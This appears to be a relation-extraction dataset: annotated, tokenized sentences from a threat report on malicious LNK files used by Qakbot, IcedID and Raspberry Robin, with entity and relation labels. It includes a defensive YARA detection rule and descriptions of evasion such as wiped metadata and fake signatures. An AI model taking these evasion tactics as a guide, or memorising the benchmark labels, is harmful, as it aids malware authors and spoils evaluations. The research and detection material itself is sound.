"global_pos": [5, 5], "name": "LNK", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "DLL file", "pos": [11, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [169, 169], "name": "these files", "pos": [12, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [193, 193], "name": "LNK files", "pos": [3, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [202, 202], "name": "Raspberry Robin", "pos": [12, 14], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [221, 221], "name": "LNK files", "pos": [6, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [258, 258], "name": "Qakbot", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [269, 269], "name": "ISO files", "pos": [31, 33], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [282, 282], "name": "payload", "pos": [44, 45], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [293, 293], "name": "Qakbot", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [302, 302], "name": "LNK files", "pos": [18, 20], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2, 3], "t": 0, "h": 4}, {"r": "WR", "evidence": [0, 1, 2, 3], "t": 1, "h": 4}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 4}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 4}, {"r": "CO", "evidence": [3, 4], "h": 3, "t": 5}, {"r": "FR", "evidence": [5], "h": 6, "t": 7}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "EX", "evidence": [5], "h": 7, "t": 8}, {"r": "UK", "evidence": [5, 6], "t": 8, "h": 9}, {"r": "WR", "evidence": [6], "h": 9, "t": 10}]}, {"title": "058-7", "sents": [["A", "simple", "YARA", "rule", "could", "be", "used", "to", "detect", "such", "samples", ":", "rule", "lnk_wiped", "{", "meta", ":", "author=", "''", "gvenere", "''", "description=", "''", "LNK", "with", "wiped", "metadata", "''", "strings", ":", "$", "lnk_magic", "=", "{", "4c", "00", "00", "00", "}", "$", "ext1", "=", "``", ".js", "''", "//", "additional", "strings", "to", "search", "$", "ext2", "=", "``", ".bat", "''", "//", "in", "the", "LNK", "target", "area", "$", "ext3", "=", "``", ".cmd", "''", "//", "These", "are", "for", "Qakbotcondition", ":", "$", "lnk_magic", "at", "0x0", "anduint16", "(", "0x1c", ")", "==", "0x0", "and", "//", "CreationTime", "==", "0x0uint16", "(", "0x24", ")", "==", "0x0", "and", "//", "AccessTime", "==", "0x0uint16", "(", "0x2c", ")", "==", "0x0", "and", "//", "WriteTime", "==", "0x0//", "To", "target", "specific", "families", "we", "can", "add", "additional", "check"], ["0x100", ")", ")", "}", "Other", "tools", "use", "the", "proper", "methods", "to", "create", "these", "files", ",", "but", "that", "opens", "an", "opportunity", "to", "identify", "information", "specific", "to", "the", "machine", "where", "the", "sample", "was", "created", "."], ["In", "general", ",", "LNK", "files", "are", "used", "by", "worm", "type", "malware", "like", "Raspberry", "Robin", "in", "order", "to", "spread", "to", "removable", "disks", "or", "network", "shares", "."], ["Source", ":", "VirusTotalInterestingly", ",", "many", "malicious", "LNK", "files", "submitted", "to", "VT", "during", "this", "period", "had", "all", "the", "metadata", "removed", "from", "the", "file", "."], ["However", ",", "after", "Microsoft", "announced", "changes", "to", "how", "macros", "were", "executed", "by", "default", "on", "internet", "downloaded", "content", ",", "Talos", "found", "Qakbot", "increasingly", "moving", "away", "from", "the", "XLSB", "files", "in", "favor", "of", "ISO", "files", "containing", "a", "LNK", "file", ",", "which", "would", "download", "and", "execute", "the", "payload", "."], ["Interestingly", ",", "at", "this", "point", "the", "``", "Obama", "''", "Qakbot", "campaign", "began", "wiping", "out", "the", "metadata", "on", "their", "LNK", "files", ",", "but", "the", "Target", "field", "always", "pointed", "to", "the", "JS", ",", "BAT", "or", "CMD", "file", "used", "to", "start", "the", "malicious", "DLL", "part", "of", "the", "initial", "infection", "chain", "(", "Figure", "9", ")", ":", "Figure", "9", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "Obama", "''", "campaignThe", "same", "behavior", "started", "to", "happen", "on", "``", "BB", "''", "campaign", "'", "s", "LNK", "files", "starting", "on", "September", "13th", "."], ["We", "can", "see", "in", "Figure", "10", "that", "samples", "mapped", "to", "the", "``", "BB", "''", "campaign", "in", "September", "still", "had", "Drive", "Serial", "Number", "information", ":", "Figure", "10", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "BB", "''", "campaignWe", "also", "observe", "that", "the", "Drive", "Serial", "Number", "matches", "the", "one", "used", "by", "the", "``", "AA", "''", "campaign", "from", "the", "May/July", "timeframe", ",", "which", "could", "indicate", "``", "AA", "''", "and", "``", "BB", "''", "are", "probably", "managed", "by", "the", "same", "group", "."], ["By", "analyzing", "the", "metadata", "content", "of", "the", "LNK", "file", "in", "the", "report", ",", "Talos", "associated", "the", "machine", "IDs", "where", "the", "files", "were", "generated", ",", "to", "files", "associated", "with", "the", "Gamaredon", "APT", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [130, 130], "name": "these files", "pos": [12, 14], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [154, 154], "name": "LNK files", "pos": [3, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [163, 163], "name": "Raspberry Robin", "pos": [12, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [182, 182], "name": "LNK files", "pos": [6, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [219, 219], "name": "Qakbot", "pos": [20, 21], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [230, 230], "name": "ISO files", "pos": [31, 33], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [243, 243], "name": "payload", "pos": [44, 45], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [254, 254], "name": "Qakbot", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [263, 263], "name": "LNK files", "pos": [18, 20], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [413, 413], "name": "LNK file", "pos": [7, 9], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "t": 0, "h": 2}, {"r": "WR", "evidence": [1, 2], "t": 0, "h": 2}, {"r": "CO", "evidence": [2, 3], "h": 1, "t": 3}, {"r": "FR", "evidence": [4], "h": 4, "t": 5}, {"r": "WR", "evidence": [4], "h": 5, "t": 6}, {"r": "EX", "evidence": [4], "h": 5, "t": 6}, {"r": "UK", "evidence": [4, 5], "t": 6, "h": 7}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}]}, {"title": "058-8", "sents": [["0x100", ")", ")", "}", "Other", "tools", "use", "the", "proper", "methods", "to", "create", "these", "files", ",", "but", "that", "opens", "an", "opportunity", "to", "identify", "information", "specific", "to", "the", "machine", "where", "the", "sample", "was", "created", "."], ["In", "general", ",", "LNK", "files", "are", "used", "by", "worm", "type", "malware", "like", "Raspberry", "Robin", "in", "order", "to", "spread", "to", "removable", "disks", "or", "network", "shares", "."], ["Source", ":", "VirusTotalInterestingly", ",", "many", "malicious", "LNK", "files", "submitted", "to", "VT", "during", "this", "period", "had", "all", "the", "metadata", "removed", "from", "the", "file", "."], ["However", ",", "after", "Microsoft", "announced", "changes", "to", "how", "macros", "were", "executed", "by", "default", "on", "internet", "downloaded", "content", ",", "Talos", "found", "Qakbot", "increasingly", "moving", "away", "from", "the", "XLSB", "files", "in", "favor", "of", "ISO", "files", "containing", "a", "LNK", "file", ",", "which", "would", "download", "and", "execute", "the", "payload", "."], ["Interestingly", ",", "at", "this", "point", "the", "``", "Obama", "''", "Qakbot", "campaign", "began", "wiping", "out", "the", "metadata", "on", "their", "LNK", "files", ",", "but", "the", "Target", "field", "always", "pointed", "to", "the", "JS", ",", "BAT", "or", "CMD", "file", "used", "to", "start", "the", "malicious", "DLL", "part", "of", "the", "initial", "infection", "chain", "(", "Figure", "9", ")", ":", "Figure", "9", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "Obama", "''", "campaignThe", "same", "behavior", "started", "to", "happen", "on", "``", "BB", "''", "campaign", "'", "s", "LNK", "files", "starting", "on", "September", "13th", "."], ["We", "can", "see", "in", "Figure", "10", "that", "samples", "mapped", "to", "the", "``", "BB", "''", "campaign", "in", "September", "still", "had", "Drive", "Serial", "Number", "information", ":", "Figure", "10", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "BB", "''", "campaignWe", "also", "observe", "that", "the", "Drive", "Serial", "Number", "matches", "the", "one", "used", "by", "the", "``", "AA", "''", "campaign", "from", "the", "May/July", "timeframe", ",", "which", "could", "indicate", "``", "AA", "''", "and", "``", "BB", "''", "are", "probably", "managed", "by", "the", "same", "group", "."], ["By", "analyzing", "the", "metadata", "content", "of", "the", "LNK", "file", "in", "the", "report", ",", "Talos", "associated", "the", "machine", "IDs", "where", "the", "files", "were", "generated", ",", "to", "files", "associated", "with", "the", "Gamaredon", "APT", "."], ["The", "interesting", "point", "here", "is", "that", "there", "is", "no", "provision", "in", "the", "LNK", "file", "format", "for", "a", "digisig", ",", "which", "means", "the", "digisig", "is", "probably", "present", "only", "as", "garbage", "data", "to", "confuse", "AV", "scanners", "and", "is", "a", "common", "technique", "used", "by", "many", "malware", "families", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "these files", "pos": [12, 14], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "LNK files", "pos": [3, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "Raspberry Robin", "pos": [12, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "LNK files", "pos": [6, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "Qakbot", "pos": [20, 21], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [112, 112], "name": "ISO files", "pos": [31, 33], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [125, 125], "name": "payload", "pos": [44, 45], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [136, 136], "name": "Qakbot", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [145, 145], "name": "LNK files", "pos": [18, 20], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [295, 295], "name": "LNK file", "pos": [7, 9], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "FR", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "EX", "evidence": [3], "h": 5, "t": 6}, {"r": "UK", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}]}, {"title": "058-9", "sents": [["In", "general", ",", "LNK", "files", "are", "used", "by", "worm", "type", "malware", "like", "Raspberry", "Robin", "in", "order", "to", "spread", "to", "removable", "disks", "or", "network", "shares", "."], ["Source", ":", "VirusTotalInterestingly", ",", "many", "malicious", "LNK", "files", "submitted", "to", "VT", "during", "this", "period", "had", "all", "the", "metadata", "removed", "from", "the", "file", "."], ["However", ",", "after", "Microsoft", "announced", "changes", "to", "how", "macros", "were", "executed", "by", "default", "on", "internet", "downloaded", "content", ",", "Talos", "found", "Qakbot", "increasingly", "moving", "away", "from", "the", "XLSB", "files", "in", "favor", "of", "ISO", "files", "containing", "a", "LNK", "file", ",", "which", "would", "download", "and", "execute", "the", "payload", "."], ["Interestingly", ",", "at", "this", "point", "the", "``", "Obama", "''", "Qakbot", "campaign", "began", "wiping", "out", "the", "metadata", "on", "their", "LNK", "files", ",", "but", "the", "Target", "field", "always", "pointed", "to", "the", "JS", ",", "BAT", "or", "CMD", "file", "used", "to", "start", "the", "malicious", "DLL", "part", "of", "the", "initial", "infection", "chain", "(", "Figure", "9", ")", ":", "Figure", "9", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "Obama", "''", "campaignThe", "same", "behavior", "started", "to", "happen", "on", "``", "BB", "''", "campaign", "'", "s", "LNK", "files", "starting", "on", "September", "13th", "."], ["We", "can", "see", "in", "Figure", "10", "that", "samples", "mapped", "to", "the", "``", "BB", "''", "campaign", "in", "September", "still", "had", "Drive", "Serial", "Number", "information", ":", "Figure", "10", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "BB", "''", "campaignWe", "also", "observe", "that", "the", "Drive", "Serial", "Number", "matches", "the", "one", "used", "by", "the", "``", "AA", "''", "campaign", "from", "the", "May/July", "timeframe", ",", "which", "could", "indicate", "``", "AA", "''", "and", "``", "BB", "''", "are", "probably", "managed", "by", "the", "same", "group", "."], ["By", "analyzing", "the", "metadata", "content", "of", "the", "LNK", "file", "in", "the", "report", ",", "Talos", "associated", "the", "machine", "IDs", "where", "the", "files", "were", "generated", ",", "to", "files", "associated", "with", "the", "Gamaredon", "APT", "."], ["The", "interesting", "point", "here", "is", "that", "there", "is", "no", "provision", "in", "the", "LNK", "file", "format", "for", "a", "digisig", ",", "which", "means", "the", "digisig", "is", "probably", "present", "only", "as", "garbage", "data", "to", "confuse", "AV", "scanners", "and", "is", "a", "common", "technique", "used", "by", "many", "malware", "families", "."], ["In", "August", "2022", ",", "a", "user", "submitted", "a", "test", "link", "file", "to", "VT", ",", "with", "a", "file", "path", "containing", "the", "individual", "'", "s", "username", ":", "``", "Lamar", "''", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "LNK files", "pos": [3, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "Raspberry Robin", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "LNK files", "pos": [6, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [68, 68], "name": "Qakbot", "pos": [20, 21], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [79, 79], "name": "ISO files", "pos": [31, 33], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [92, 92], "name": "payload", "pos": [44, 45], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [103, 103], "name": "Qakbot", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "LNK files", "pos": [18, 20], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [262, 262], "name": "LNK file", "pos": [7, 9], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [341, 341], "name": "link file", "pos": [9, 11], "index": "9_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "FR", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "UK", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}]}, {"title": "058-10", "sents": [["Source", ":", "VirusTotalInterestingly", ",", "many", "malicious", "LNK", "files", "submitted", "to", "VT", "during", "this", "period", "had", "all", "the", "metadata", "removed", "from", "the", "file", "."], ["However", ",", "after", "Microsoft", "announced", "changes", "to", "how", "macros", "were", "executed", "by", "default", "on", "internet", "downloaded", "content", ",", "Talos", "found", "Qakbot", "increasingly", "moving", "away", "from", "the", "XLSB", "files", "in", "favor", "of", "ISO", "files", "containing", "a", "LNK", "file", ",", "which", "would", "download", "and", "execute", "the", "payload", "."], ["Interestingly", ",", "at", "this", "point", "the", "``", "Obama", "''", "Qakbot", "campaign", "began", "wiping", "out", "the", "metadata", "on", "their", "LNK", "files", ",", "but", "the", "Target", "field", "always", "pointed", "to", "the", "JS", ",", "BAT", "or", "CMD", "file", "used", "to", "start", "the", "malicious", "DLL", "part", "of", "the", "initial", "infection", "chain", "(", "Figure", "9", ")", ":", "Figure", "9", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "Obama", "''", "campaignThe", "same", "behavior", "started", "to", "happen", "on", "``", "BB", "''", "campaign", "'", "s", "LNK", "files", "starting", "on", "September", "13th", "."], ["We", "can", "see", "in", "Figure", "10", "that", "samples", "mapped", "to", "the", "``", "BB", "''", "campaign", "in", "September", "still", "had", "Drive", "Serial", "Number", "information", ":", "Figure", "10", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "BB", "''", "campaignWe", "also", "observe", "that", "the", "Drive", "Serial", "Number", "matches", "the", "one", "used", "by", "the", "``", "AA", "''", "campaign", "from", "the", "May/July", "timeframe", ",", "which", "could", "indicate", "``", "AA", "''", "and", "``", "BB", "''", "are", "probably", "managed", "by", "the", "same", "group", "."], ["By", "analyzing", "the", "metadata", "content", "of", "the", "LNK", "file", "in", "the", "report", ",", "Talos", "associated", "the", "machine", "IDs", "where", "the", "files", "were", "generated", ",", "to", "files", "associated", "with", "the", "Gamaredon", "APT", "."], ["The", "interesting", "point", "here", "is", "that", "there", "is", "no", "provision", "in", "the", "LNK", "file", "format", "for", "a", "digisig", ",", "which", "means", "the", "digisig", "is", "probably", "present", "only", "as", "garbage", "data", "to", "confuse", "AV", "scanners", "and", "is", "a", "common", "technique", "used", "by", "many", "malware", "families", "."], ["In", "August", "2022", ",", "a", "user", "submitted", "a", "test", "link", "file", "to", "VT", ",", "with", "a", "file", "path", "containing", "the", "individual", "'", "s", "username", ":", "``", "Lamar", "''", "."], ["This", "LNK", "file", "was", "created", "on", "the", "same", "machine", "responsible", "for", "the", "LNK", "files", "used", "in", "a", "previous", "IcedID", "campaign", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "LNK files", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "Qakbot", "pos": [20, 21], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "ISO files", "pos": [31, 33], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [67, 67], "name": "payload", "pos": [44, 45], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [78, 78], "name": "Qakbot", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [87, 87], "name": "LNK files", "pos": [18, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [237, 237], "name": "LNK file", "pos": [7, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [316, 316], "name": "link file", "pos": [9, 11], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [337, 337], "name": "LNK file", "pos": [1, 3], "index": "8_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "UK", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [6, 7], "h": 7, "t": 8}]}, {"title": "058-11", "sents": [["However", ",", "after", "Microsoft", "announced", "changes", "to", "how", "macros", "were", "executed", "by", "default", "on", "internet", "downloaded", "content", ",", "Talos", "found", "Qakbot", "increasingly", "moving", "away", "from", "the", "XLSB", "files", "in", "favor", "of", "ISO", "files", "containing", "a", "LNK", "file", ",", "which", "would", "download", "and", "execute", "the", "payload", "."], ["Interestingly", ",", "at", "this", "point", "the", "``", "Obama", "''", "Qakbot", "campaign", "began", "wiping", "out", "the", "metadata", "on", "their", "LNK", "files", ",", "but", "the", "Target", "field", "always", "pointed", "to", "the", "JS", ",", "BAT", "or", "CMD", "file", "used", "to", "start", "the", "malicious", "DLL", "part", "of", "the", "initial", "infection", "chain", "(", "Figure", "9", ")", ":", "Figure", "9", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "Obama", "''", "campaignThe", "same", "behavior", "started", "to", "happen", "on", "``", "BB", "''", "campaign", "'", "s", "LNK", "files", "starting", "on", "September", "13th", "."], ["We", "can", "see", "in", "Figure", "10", "that", "samples", "mapped", "to", "the", "``", "BB", "''", "campaign", "in", "September", "still", "had", "Drive", "Serial", "Number", "information", ":", "Figure", "10", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "BB", "''", "campaignWe", "also", "observe", "that", "the", "Drive", "Serial", "Number", "matches", "the", "one", "used", "by", "the", "``", "AA", "''", "campaign", "from", "the", "May/July", "timeframe", ",", "which", "could", "indicate", "``", "AA", "''", "and", "``", "BB", "''", "are", "probably", "managed", "by", "the", "same", "group", "."], ["By", "analyzing", "the", "metadata", "content", "of", "the", "LNK", "file", "in", "the", "report", ",", "Talos", "associated", "the", "machine", "IDs", "where", "the", "files", "were", "generated", ",", "to", "files", "associated", "with", "the", "Gamaredon", "APT", "."], ["The", "interesting", "point", "here", "is", "that", "there", "is", "no", "provision", "in", "the", "LNK", "file", "format", "for", "a", "digisig", ",", "which", "means", "the", "digisig", "is", "probably", "present", "only", "as", "garbage", "data", "to", "confuse", "AV", "scanners", "and", "is", "a", "common", "technique", "used", "by", "many", "malware", "families", "."], ["In", "August", "2022", ",", "a", "user", "submitted", "a", "test", "link", "file", "to", "VT", ",", "with", "a", "file", "path", "containing", "the", "individual", "'", "s", "username", ":", "``", "Lamar", "''", "."], ["This", "LNK", "file", "was", "created", "on", "the", "same", "machine", "responsible", "for", "the", "LNK", "files", "used", "in", "a", "previous", "IcedID", "campaign", "."], ["A", "few", "hours", "later", "the", "same", "user", "submitted", "another", "file", "with", "hash", "e89cd1999517b47805106111e14d", ",", "this", "time", "with", "user", "information", "sanitized", ",", "and", "packaged", "in", "a", "Zip", "file", "containing", "a", "BAT", "and", "DLL", "file", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "Qakbot", "pos": [20, 21], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [31, 31], "name": "ISO files", "pos": [31, 33], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [44, 44], "name": "payload", "pos": [44, 45], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [55, 55], "name": "Qakbot", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [64, 64], "name": "LNK files", "pos": [18, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [214, 214], "name": "LNK file", "pos": [7, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [293, 293], "name": "link file", "pos": [9, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [314, 314], "name": "LNK file", "pos": [1, 3], "index": "7_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "UK", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 7}]}, {"title": "058-12", "sents": [["Interestingly", ",", "at", "this", "point", "the", "``", "Obama", "''", "Qakbot", "campaign", "began", "wiping", "out", "the", "metadata", "on", "their", "LNK", "files", ",", "but", "the", "Target", "field", "always", "pointed", "to", "the", "JS", ",", "BAT", "or", "CMD", "file", "used", "to", "start", "the", "malicious", "DLL", "part", "of", "the", "initial", "infection", "chain", "(", "Figure", "9", ")", ":", "Figure", "9", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "Obama", "''", "campaignThe", "same", "behavior", "started", "to", "happen", "on", "``", "BB", "''", "campaign", "'", "s", "LNK", "files", "starting", "on", "September", "13th", "."], ["We", "can", "see", "in", "Figure", "10", "that", "samples", "mapped", "to", "the", "``", "BB", "''", "campaign", "in", "September", "still", "had", "Drive", "Serial", "Number", "information", ":", "Figure", "10", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "BB", "''", "campaignWe", "also", "observe", "that", "the", "Drive", "Serial", "Number", "matches", "the", "one", "used", "by", "the", "``", "AA", "''", "campaign", "from", "the", "May/July", "timeframe", ",", "which", "could", "indicate", "``", "AA", "''", "and", "``", "BB", "''", "are", "probably", "managed", "by", "the", "same", "group", "."], ["By", "analyzing", "the", "metadata", "content", "of", "the", "LNK", "file", "in", "the", "report", ",", "Talos", "associated", "the", "machine", "IDs", "where", "the", "files", "were", "generated", ",", "to", "files", "associated", "with", "the", "Gamaredon", "APT", "."], ["The", "interesting", "point", "here", "is", "that", "there", "is", "no", "provision", "in", "the", "LNK", "file", "format", "for", "a", "digisig", ",", "which", "means", "the", "digisig", "is", "probably", "present", "only", "as", "garbage", "data", "to", "confuse", "AV", "scanners", "and", "is", "a", "common", "technique", "used", "by", "many", "malware", "families", "."], ["In", "August", "2022", ",", "a", "user", "submitted", "a", "test", "link", "file", "to", "VT", ",", "with", "a", "file", "path", "containing", "the", "individual", "'", "s", "username", ":", "``", "Lamar", "''", "."], ["This", "LNK", "file", "was", "created", "on", "the", "same", "machine", "responsible", "for", "the", "LNK", "files", "used", "in", "a", "previous", "IcedID", "campaign", "."], ["A", "few", "hours", "later", "the", "same", "user", "submitted", "another", "file", "with", "hash", "e89cd1999517b47805106111e14d", ",", "this", "time", "with", "user", "information", "sanitized", ",", "and", "packaged", "in", "a", "Zip", "file", "containing", "a", "BAT", "and", "DLL", "file", "."], ["The", "DLL", "file", "was", "an", "IcedID", "bot", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "Qakbot", "pos": [9, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "LNK files", "pos": [18, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [168, 168], "name": "LNK file", "pos": [7, 9], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [247, 247], "name": "link file", "pos": [9, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [268, 268], "name": "LNK file", "pos": [1, 3], "index": "4_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [4, 5], "h": 3, "t": 4}]}, {"title": "058-13", "sents": [["We", "can", "see", "in", "Figure", "10", "that", "samples", "mapped", "to", "the", "``", "BB", "''", "campaign", "in", "September", "still", "had", "Drive", "Serial", "Number", "information", ":", "Figure", "10", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "BB", "''", "campaignWe", "also", "observe", "that", "the", "Drive", "Serial", "Number", "matches", "the", "one", "used", "by", "the", "``", "AA", "''", "campaign", "from", "the", "May/July", "timeframe", ",", "which", "could", "indicate", "``", "AA", "''", "and", "``", "BB", "''", "are", "probably", "managed", "by", "the", "same", "group", "."], ["By", "analyzing", "the", "metadata", "content", "of", "the", "LNK", "file", "in", "the", "report", ",", "Talos", "associated", "the", "machine", "IDs", "where", "the", "files", "were", "generated", ",", "to", "files", "associated", "with", "the", "Gamaredon", "APT", "."], ["The", "interesting", "point", "here", "is", "that", "there", "is", "no", "provision", "in", "the", "LNK", "file", "format", "for", "a", "digisig", ",", "which", "means", "the", "digisig", "is", "probably", "present", "only", "as", "garbage", "data", "to", "confuse", "AV", "scanners", "and", "is", "a", "common", "technique", "used", "by", "many", "malware", "families", "."], ["In", "August", "2022", ",", "a", "user", "submitted", "a", "test", "link", "file", "to", "VT", ",", "with", "a", "file", "path", "containing", "the", "individual", "'", "s", "username", ":", "``", "Lamar", "''", "."], ["This", "LNK", "file", "was", "created", "on", "the", "same", "machine", "responsible", "for", "the", "LNK", "files", "used", "in", "a", "previous", "IcedID", "campaign", "."], ["A", "few", "hours", "later", "the", "same", "user", "submitted", "another", "file", "with", "hash", "e89cd1999517b47805106111e14d", ",", "this", "time", "with", "user", "information", "sanitized", ",", "and", "packaged", "in", "a", "Zip", "file", "containing", "a", "BAT", "and", "DLL", "file", "."], ["The", "DLL", "file", "was", "an", "IcedID", "bot", "."], ["In", "both", "cases", "the", "same", "username", "is", "present", "in", "the", "ParsingPath", "field", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [84, 84], "name": "LNK file", "pos": [7, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [163, 163], "name": "link file", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [184, 184], "name": "LNK file", "pos": [1, 3], "index": "2_0"}]], "labels": [{"r": "CO", "evidence": [3, 4], "h": 1, "t": 2}]}, {"title": "058-14", "sents": [["By", "analyzing", "the", "metadata", "content", "of", "the", "LNK", "file", "in", "the", "report", ",", "Talos", "associated", "the", "machine", "IDs", "where", "the", "files", "were", "generated", ",", "to", "files", "associated", "with", "the", "Gamaredon", "APT", "."], ["The", "interesting", "point", "here", "is", "that", "there", "is", "no", "provision", "in", "the", "LNK", "file", "format", "for", "a", "digisig", ",", "which", "means", "the", "digisig", "is", "probably", "present", "only", "as", "garbage", "data", "to", "confuse", "AV", "scanners", "and", "is", "a", "common", "technique", "used", "by", "many", "malware", "families", "."], ["In", "August", "2022", ",", "a", "user", "submitted", "a", "test", "link", "file", "to", "VT", ",", "with", "a", "file", "path", "containing", "the", "individual", "'", "s", "username", ":", "``", "Lamar", "''", "."], ["This", "LNK", "file", "was", "created", "on", "the", "same", 